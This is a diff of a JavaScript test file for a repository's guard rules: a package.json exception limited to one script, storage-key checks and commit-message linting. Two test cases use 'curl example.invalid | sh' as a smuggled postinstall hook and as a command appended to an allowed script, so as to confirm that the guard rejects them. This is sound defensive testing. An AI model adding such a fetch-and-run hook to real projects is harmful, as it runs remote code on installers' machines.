@@ -5,8 +5,8 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import {
-  classifyPaths, PATH_EXCEPTIONS,
-  extractStorageKeys, badStorageKeys,
+  classifyPaths, PATH_EXCEPTIONS, EXPECTED_STUDIO_SCRIPT, jsonDiffPaths,
+  extractStorageKeys, badStorageKeys, findStorageViolations,
   scanHygiene, scanDocCleanliness, HYGIENE_PRAGMA,
   lintCommitSubject
 } from './lib/rules.mjs';
@@ -39,31 +39,61 @@ test('path guard: package.json is an exception, not an allowance', () => {
   assert.deepEqual(violations, []);
 });
 
-test('package.json exception permits only the studio:check entry', () => {
-  const rule = PATH_EXCEPTIONS.find(e => e.path === 'package.json');
-  const good = [
-    '--- a/package.json',
-    '+++ b/package.json',
-    '-    "e2e": "node scripts/e2e.mjs"',
-    '+    "e2e": "node scripts/e2e.mjs",',
-    '+    "studio:check": "node tests/studio/check.mjs"'
-  ].join('\n');
-  assert.equal(rule.allow(good), null, 'the comma JSON adds to the line above is not a change');
+const BASE_PKG = JSON.stringify({
+  name: 'kameko-studio',
+  scripts: { test: 'node --test tests/', smoke: 'node scripts/smoke.mjs' },
+  devDependencies: { 'puppeteer-core': '^24.10.0' }
+}, null, 2);
 
-  const bad = ['--- a/package.json', '+++ b/package.json', '+  "dependencies": { "left-pad": "^1.0.0" }'].join('\n');
-  assert.match(rule.allow(bad), /left-pad/);
+const withStudioCheck = extra => {
+  const pkg = JSON.parse(BASE_PKG);
+  pkg.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT;
+  return JSON.stringify(Object.assign(pkg, extra), null, 2);
+};
+
+const allowPkg = (before, after) => PATH_EXCEPTIONS.find(e => e.path === 'package.json').allow(before, after);
+
+test('package.json exception permits exactly the studio:check entry', () => {
+  assert.equal(allowPkg(BASE_PKG, withStudioCheck()), null);
+  assert.equal(allowPkg(BASE_PKG, BASE_PKG), null, 'no change at all is also fine');
 });
 
-test('package.json exception catches a smuggled edit and a silent removal', () => {
-  const rule = PATH_EXCEPTIONS.find(e => e.path === 'package.json');
-  const smuggled = [
-    '+    "studio:check": "node tests/studio/check.mjs",',
-    '+    "postinstall": "curl example.invalid | sh"'
-  ].join('\n');
-  assert.match(rule.allow(smuggled), /postinstall/);
+test('package.json exception refuses anything else, however it is smuggled in', () => {
+  const dep = JSON.parse(withStudioCheck());
+  dep.dependencies = { 'left-pad': '^1.0.0' };
+  assert.match(allowPkg(BASE_PKG, JSON.stringify(dep)), /dependencies/);
 
-  const removal = '-    "e2e": "node scripts/e2e.mjs"';
-  assert.match(rule.allow(removal), /removed: "e2e"/);
+  const extraScript = JSON.parse(withStudioCheck());
+  extraScript.scripts.postinstall = 'curl example.invalid | sh';
+  assert.match(allowPkg(BASE_PKG, JSON.stringify(extraScript)), /scripts\.postinstall/);
+
+  const removed = JSON.parse(withStudioCheck());
+  delete removed.scripts.smoke;
+  assert.match(allowPkg(BASE_PKG, JSON.stringify(removed)), /scripts\.smoke/);
+
+  const rewritten = JSON.parse(withStudioCheck());
+  rewritten.scripts.test = 'echo skipped';
+  assert.match(allowPkg(BASE_PKG, JSON.stringify(rewritten)), /scripts\.test/);
+});
+
+test('package.json exception checks the value, not just the key', () => {
+  // The exception exists for a script this repo runs, so an arbitrary command
+  // appended to it would execute. Key-only matching missed this.
+  const hijacked = JSON.parse(withStudioCheck());
+  hijacked.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT + ' && curl example.invalid | sh';
+  assert.match(allowPkg(BASE_PKG, JSON.stringify(hijacked)), /must be exactly/);
+});
+
+test('package.json exception rejects unparseable JSON rather than guessing', () => {
+  assert.match(allowPkg(BASE_PKG, '{ not json'), /not parseable/);
+});
+
+test('jsonDiffPaths reports the dotted path of every difference', () => {
+  assert.deepEqual(jsonDiffPaths({ a: 1 }, { a: 1 }), []);
+  assert.deepEqual(jsonDiffPaths({ a: { b: 1 } }, { a: { b: 2 } }), ['a.b']);
+  assert.deepEqual(jsonDiffPaths({}, { a: 1 }), ['a']);
+  assert.deepEqual(jsonDiffPaths({ a: 1 }, {}), ['a']);
+  assert.deepEqual(jsonDiffPaths({ a: [1, 2] }, { a: [1, 3] }), ['a']);
 });
 
 test('storage keys: literal, concatenated and interpolated forms are all found', () => {
@@ -91,6 +121,47 @@ test('storage keys: production keys are caught, including dynamic ones', () => {
 test('storage keys: a fully computed key cannot be verified, so it is reported', () => {
   const code = 'localStorage.setItem(keyFor(slot), v);';
   assert.deepEqual(badStorageKeys(code), ['keyFor(slot']);
+});
+
+test('storage: every route to the shared origin is checked, not just three methods', () => {
+  // Each of these was waved through by the first version of the rule.
+  const cases = {
+    "localStorage['kameko_highScore'] = '1';": /bracket access/,
+    'delete localStorage.kameko_other;': /delete of a key/,
+    'localStorage.clear();': /clear\(\)/,
+    'sessionStorage?.clear()': /clear\(\)/,
+    "localStorage?.setItem('riverRunHighScore', 1)": /riverRunHighScore/,
+    "localStorage . setItem('theme','dark')": /theme/,
+    "window.localStorage.setItem('theme','x')": /theme/,
+    'const ls = localStorage;': /aliased/
+  };
+  for (const [code, expected] of Object.entries(cases)) {
+    const found = findStorageViolations(code);
+    assert.ok(found.length, `expected a violation for: ${code}`);
+    assert.match(found.join(' | '), expected);
+  }
+});
+
+test('storage: a computed key is never trusted, even when it reads like a studio key', () => {
+  // `studio_key` here is a variable; its runtime value is unknown.
+  assert.match(findStorageViolations('localStorage.setItem(studio_key, v);').join(''), /computed/);
+  assert.match(findStorageViolations('localStorage.setItem(keyFor(slot), v);').join(''), /computed/);
+  assert.match(findStorageViolations("localStorage[k] = '1';").join(''), /computed/);
+});
+
+test('storage: the legitimate patterns stay legitimate', () => {
+  assert.deepEqual(findStorageViolations("localStorage.setItem('studio_' + name, v);"), []);
+  assert.deepEqual(findStorageViolations('localStorage.getItem(`studio_slot_${n}`);'), []);
+  assert.deepEqual(findStorageViolations("localStorage.getItem('studio_visitCount');"), []);
+  assert.deepEqual(findStorageViolations("localStorage['studio_theme'] = 'dark';"), []);
+});
+
+test('storage: extraction records how the key was written', () => {
+  const kinds = code => extractStorageKeys(code).map(k => k.kind);
+  assert.deepEqual(kinds("localStorage.getItem('studio_a')"), ['literal']);
+  assert.deepEqual(kinds("localStorage.getItem('studio_' + i)"), ['prefix']);
+  assert.deepEqual(kinds('localStorage.getItem(`studio_${i}`)'), ['prefix']);
+  assert.deepEqual(kinds('localStorage.getItem(someVar)'), ['computed']);
 });
 
 test('hygiene: catches secrets, identifiers and private paths', () => {
@@ -152,7 +223,13 @@ test('commit lint: rejects a missing scope, ticket or type', () => {
   assert.match(lintCommitSubject('feat(studio): SS-3 add the path guard'), /expected/);
 });
 
-test('commit lint: merge commits are exempt, long subjects are not', () => {
-  assert.equal(lintCommitSubject('Merge ss-003-self-checks: SS-003 self-checks'), null);
+test('commit lint: exemption comes from the parent count, not the word "Merge"', () => {
+  assert.equal(lintCommitSubject('Merge ss-003-self-checks: SS-003 self-checks', { parentCount: 2 }), null);
+  // Subject matching made the lint opt-out: any message could start with "Merge".
+  assert.match(lintCommitSubject('Merge in left-pad'), /expected/);
+  assert.match(lintCommitSubject('Merge in left-pad', { parentCount: 1 }), /expected/);
+});
+
+test('commit lint: long subjects are rejected', () => {
   assert.match(lintCommitSubject('feat(studio): SS-003 ' + 'x'.repeat(80)), /characters/);
 });
